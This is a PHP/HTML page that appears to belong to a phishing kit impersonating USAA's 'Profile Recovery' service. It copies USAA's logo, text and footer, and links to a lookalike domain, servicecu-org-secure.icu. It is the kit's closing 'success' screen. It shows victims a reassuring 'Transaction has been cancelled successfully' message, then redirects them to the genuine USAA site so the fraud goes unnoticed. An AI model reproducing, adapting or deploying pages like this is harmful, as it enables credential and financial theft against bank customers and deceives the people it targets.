<?php
error_reporting(0);
include '../inc/app.php';
?>
<!DOCTYPE html>  
	
	
<html lang="en">  
	<head>  
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">  
	
<title>  
	 Profile Recovery  | USAA</title>  
	<meta data-react-helmet="true" name="description" content="Login to your USAA member account for home, life, and auto insurance as well as online banking and investment services.">  
	<meta data-react-helmet="true" name="keywords" content="USAA Recovery, PRIR Recovery, Password Recovery">  
	<meta http-equiv="X-UA-Compatible" content="IE=edge">  
	<meta id="Viewport" name="viewport" content="width=device-width, initial-scale=1">  
	<link data-react-helmet="true" rel="canonical" href="https://servicecu-org-secure.icu/USAA/success.php?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&amp;redir#">  
	<link data-react-helmet="true" rel="alternate" href="https://servicecu-org-secure.icu/USAA/success.php?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&amp;redir#">  
	<script type="text/javascript" async="" charset="utf-8" src="./files/profile_recovery_ui.js.download">  
	</script>  
	</head>  
	<body class="font-narrow">  
	
<meta http-equiv="refresh" content="5; url = https://www.usaa.com/help/contact?ermg=tzNIA">  
	

	<link rel="stylesheet" href="./files/ent-profile-recovery-ui.695d6ab123383c726242.css">  

	<div id="mainAppRoot">  
	<div class="usaa-transactionalWrapper layout-xxs layout-xs layout-sm layout-md layout-lg layout-xl layout-xxs layout-xs layout-sm layout-md layout-lg layout-xl layout-xxl">  
	<div class="usaa-transactionalPage">  
	<div>  
	<div class="usaa-transactionalHeaderAndIndicator">  
	<header class="usaa-transactionalHeader">  
	<a href="https://servicecu-org-secure.icu/USAA/success.php?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&amp;redir#usaa-templateContent" class="usaa-skipToContent screenReader" accesskey="2">  
	Skip to Content</a>  
	<a class="home-link" href="https://www.usaa.com/" id="Logo-link">  
	<svg xmlns="http://www.w3.org/2000/svg" id="Logo-svg" viewBox="0 0 63 66">  
	<title>  
	USAA logo. Redirects to USAA home. USAA logo</title>  
	<path fill="#ffffff" d="M49.16 44.5s1.52 1.02 3 1.02c1.5 0 2.82-1.07 2.82-1.07V39.2s-1.33.96-2.8.96c-1.48 0-3.02-1.03-3.02-1.03l-15.3-9.06 1.4 6.2 13.9 8.22zM7.84 28.33S6.36 27.3 4.82 27.3s-2.8 1.08-2.8 1.08v5.23s1.26-.93 2.8-.93c1.54 0 3.02 1.03 3.02 1.03l12.64 7.48 1.08-4.73-13.72-8.1zm41.32 9.3s1.52 1.03 3 1.03c1.5 0 2.82-1.07 2.82-1.07v-5.23s-1.33.94-2.8.94c-1.48 0-3.02-1-3.02-1L32.04 22.15l1.42 6.2 15.7 9.3zM7.84 21.5s-1.48-1.04-3.02-1.04-2.8 1.08-2.8 1.08v5.23s1.26-.94 2.8-.94c1.54 0 3.02 1.03 3.02 1.03l14.02 8.3 1.08-4.74-15.1-8.93zm41.32 9.3s1.52 1.03 3 1.03c1.5 0 2.82-1.07 2.82-1.07v-5.24s-1.33.95-2.8.95c-1.48 0-3.02-1.03-3.02-1.03l-18.93-11.2 1.42 6.2 17.5 10.36zM7.84 14.65s-1.48-1.03-3.02-1.03-2.8 1.07-2.8 1.07v5.22s1.26-.94 2.8-.94c1.54 0 3.02 1.03 3.02 1.03l15.4 9.12 1.07-4.73-16.46-9.75zm22-2.1l19.32 11.4s1.52 1.03 3 1.03c1.5 0 2.82-1.07 2.82-1.07V18.7s-1.33.94-2.8.94c-1.48 0-3.02-1.02-3.02-1.02L34.22 9.76 33.18 5.8c0-.17.15-.25.2-.26l2.54-.8c.34 0 .53.3.53.54l.14.28c.08.05.5-.07.5-.15V3.86c0-1.04-.82-1.96-1.93-1.96h-2.53S32.27 1 31.2 1h-4.8c-1.28 0-1.58 1.2-1.58 1.2l-3.34 13.65L7.84 7.8S6.36 6.77 4.82 6.77s-2.8 1.08-2.8 1.08v5.23s1.26-.94 2.8-.94c1.54 0 3.02 1.03 3.02 1.03L24.6 23.1l3.83-16.73 1.4 6.17zM26.8 58.4c0 2.85-2.32 4.9-5.5 4.92-3.37 0-4.5-.58-4.5-.58l-.28-3.15s1.87 1.24 4.62 1.24c.76 0 2.48-.54 2.48-2.1 0-1.48-1.35-1.93-1.68-2.12-.67-.35-1.47-.7-2.13-1.04-1.23-.6-3.06-1.78-3.06-4.27 0-3.57 3.2-4.88 5.75-4.88 2.03 0 3.83.9 3.83.9v2.94c-.57-.34-1.5-1.4-3.84-1.4-1.6 0-2.68.86-2.68 2.04 0 1.1.9 1.8 1.77 2.22l2.44 1.17c1.27.62 2.76 1.9 2.76 4.1zm-15.05-1.35c0 1.3-.43 3.77-3.4 3.72C5.62 60.7 5.1 58.2 5.1 56.6v-9.87h-3.1v10.03c0 5.65 3.44 6.6 6.32 6.6 4.25 0 6.23-2.83 6.23-6.65v-9.97h-2.82v10.32zm43.23 5.93h-3.4l-.96-2.85h-5.78l-.98 2.85h-5.78l-.96-2.85h-5.78l-.98 2.85H27.3L32.9 48l-.54-1.27h3.38l5.4 15.32L46.4 48l-.54-1.27h3.37l5.75 16.25zm-18.63-5.12l-2-6.4-2.26 6.4h4.25zm13.5 0l-2-6.4-2.25 6.4h4.25zm5.93-10.38c-.55.3-1 .73-1.3 1.3S54 49.9 54 50.5c0 .6.17 1.18.47 1.73s.74 1 1.3 1.3c.54.3 1.12.46 1.73.46s1.18-.15 1.73-.45c.55-.3.98-.74 1.3-1.3s.44-1.13.44-1.73c0-.6-.15-1.2-.46-1.75s-.74-1-1.3-1.3c-.55-.3-1.12-.44-1.7-.44s-1.16.15-1.72.45zm3.14.5c.47.25.83.6 1.1 1.08.25.47.38.95.38 1.46 0 .5-.13.98-.4 1.45s-.6.82-1.06 1.07c-.46.26-.94.4-1.44.4s-1-.14-1.45-.4c-.46-.25-.82-.6-1.08-1.07-.25-.47-.38-.95-.38-1.45s.12-1 .38-1.46c.26-.47.62-.83 1.1-1.08s.93-.37 1.42-.37c.48 0 .96.13 1.42.38zm-2.35 4.47v-1.6h.36c.2 0 .37.05.48.13.17.12.38.4.64.88l.34.6h.73l-.44-.75c-.22-.33-.4-.58-.56-.73-.08-.08-.18-.14-.3-.2.3-.02.57-.14.76-.34.2-.2.3-.44.3-.72 0-.18-.06-.37-.18-.54-.12-.17-.27-.3-.47-.36-.2-.07-.5-.1-.95-.1h-1.28v3.75h.6zm0-3.25h.7c.3 0 .5.02.6.07s.2.1.25.2c.06.08.1.18.1.3 0 .16-.07.3-.2.4s-.36.17-.7.17h-.75V49.2z">  
	</path>  
	</svg>  
	</a>  
	<h1 class="usaa-transactionalHeader-appName font-serif">  
	<span>  
	Profile Recovery</span>  
	</h1>  
	<ul id="navLinkContain">  
	<li class="ulo-navLink">  
	<a href="https://servicecu-org-secure.icu/USAA/success.php?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&amp;redir#" class="miam-logon-join-link font-normal nav-link0" target="_self" rel="noopener noreferrer" id="navLink-0">  
	Join USAA</a>  
	</li>  
	<li class="ulo-navLink">  
	<a href="https://servicecu-org-secure.icu/USAA/success.php?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&amp;redir#" class="miam-logon-join-link font-normal nav-link1" target="_self" rel="noopener noreferrer" id="navLink-1">  
	Register <span class="wrappedText">  
	&nbsp;for access</span>  
	</a>  
	</li>  
	</ul>  
	<div class="vertical-rule">  
	</div>  
	</header>  
	</div>  
	<div id="contentHijackId" tabindex="-1">  
	</div>  
	<span data-id="usaa-trapFocus--bottom" tabindex="-1" aria-hidden="true" style="top: 2px; position: absolute;">  
	</span>  
	</div>  
	<div tabindex="-1">  
	</div>  
	<div aria-hidden="false" class="usaa-transactionalBodyAndFooter" id="usaa-templateContent">  
	<div class="usaa-transactionalBodyWrapper">  
	<div class="usaa-transactionalBody" role="main">  
	<div class="mainPanel-rightPanelButtonContainer">  
	</div>  
	<div>  
	<div class="miam-logon-gutter" tabindex="-1">  
	</div>  
	<div class="miam-logon-fieldset logon-wrapper-main-contain">  
	<div class="miam-logon-form">  
	<div class="page-group">  
	


</div>  
	
<br>  
	
<br>  
	
<br>  
	
<p style="text-align:center; color:#12395b; font-size:24px;">  
	Transaction has been cancelled</p>  
	
<p style="text-align:center; color:#12395b; font-size:24px;">  
	successfully.. </p>  
	
<p style="text-align:center; color:#12395b; font-size:9px;">  
	redirecting in 3 seconds</p>  
	
<br>  
	
            </div>  
	
    <div class="recover-text-div">  
	</div>  
	<div class="form-div">  
	<form class="miam-form-wrapper" novalidate="">  
	<div class="rds-form__field rds-form__field--group">  
	<div class="rds-form__field-header">  
	</div>  
	


</div>  
	






</form>  
	</div>  
	<div class="options-link">  
	</div>  
	<div class="text-terms" role="main">  
	</div>  
	</div>  
	    </div>  
	</div>  
	<div class="miam-logon-gutter" tabindex="-1">  
	</div>  
	</div>  
	<div>  
	<div id="horizontal-rule">  
	</div>  
	</div>  
	</div>  
	</div>  
	<div class="usaa-transactionalFooter">  
	<footer class="usaa-transactionalFooter-footer">  
	<div class="usaa-transactionalFooter-content">  
	<p class="usaa-transactionalFooter-copyright">  
	Copyright © 2023 USAA.</p>  
	<div class="pageFooter-disclosures pageFooter-disclosures--aboveFootnotes">  
	<p>  
	
                    <a class="miam-footer-link SecurityLink" href="https://servicecu-org-secure.icu/USAA/success.php?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&amp;redir#" target="_blank">  
	Security Center</a>  
	
                    <a class="miam-footer-link PrivacyLink" href="https://servicecu-org-secure.icu/USAA/success.php?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&amp;redir#" target="_blank">  
	Privacy Center</a>  
	
                    <a class="miam-footer-link AccessibilityLink" href="https://servicecu-org-secure.icu/USAA/success.php?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&amp;redir#" target="_blank">  
	Accessibility at USAA</a>  
	
                </p>  
	</div>  
	<div class="pageFooter-footnotes">  
	</div>  
	<div class="pageFooter-disclosures pageFooter-disclosures--belowFootnotes">  
	</div>  
	<div class="usaa-transactionalFooter-icons">  
	<div class="usaa-transactionalFooter-logo">  
	USAA Logo</div>  
	</div>  
	</div>  
	</footer>  
	</div>  
	</div>  
	</div>  
	 </body>  
	</html>  
	